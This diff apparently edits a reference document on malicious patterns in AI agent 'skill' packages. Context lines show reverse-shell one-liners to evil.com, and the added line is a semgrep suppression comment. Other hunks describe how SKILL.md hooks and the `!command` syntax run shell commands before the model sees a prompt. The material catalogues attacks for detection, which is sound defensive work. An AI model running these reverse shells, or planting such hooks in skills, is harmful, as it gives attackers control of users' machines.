@@ -44,6 +44,7 @@ subprocess.Popen(["/bin/sh"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.file
 ### Subprocess-Based
 ```python
 subprocess.Popen("bash -i >& /dev/tcp/evil.com/4444 0>&1", shell=True)
+# nosemgrep: skill-reverse-shell
 os.system("nc -e /bin/sh evil.com 4444")
 ```
 
@@ -174,7 +175,7 @@ Files that resolve outside the skill directory. A file named `examples/id_rsa.ex
 YAML frontmatter in SKILL.md can define `PostToolUse`, `PreToolUse`, etc. hooks that execute shell commands on lifecycle events. The model cannot prevent this — the harness runs hooks automatically.
 
 ### `!`command`` Pre-prompt Injection (Claude Code)
-The `!`command`` syntax in SKILL.md runs shell commands at template expansion time, before the model sees the prompt. Requires `allowed-tools: Bash(...)` or permissive settings.
+The `!`command`` syntax in SKILL.md runs shell commands at template expansion time, before the model sees the prompt. Requires `allowed-tools: shell command (...)` or permissive settings.
 
 ## Legitimate Patterns
 
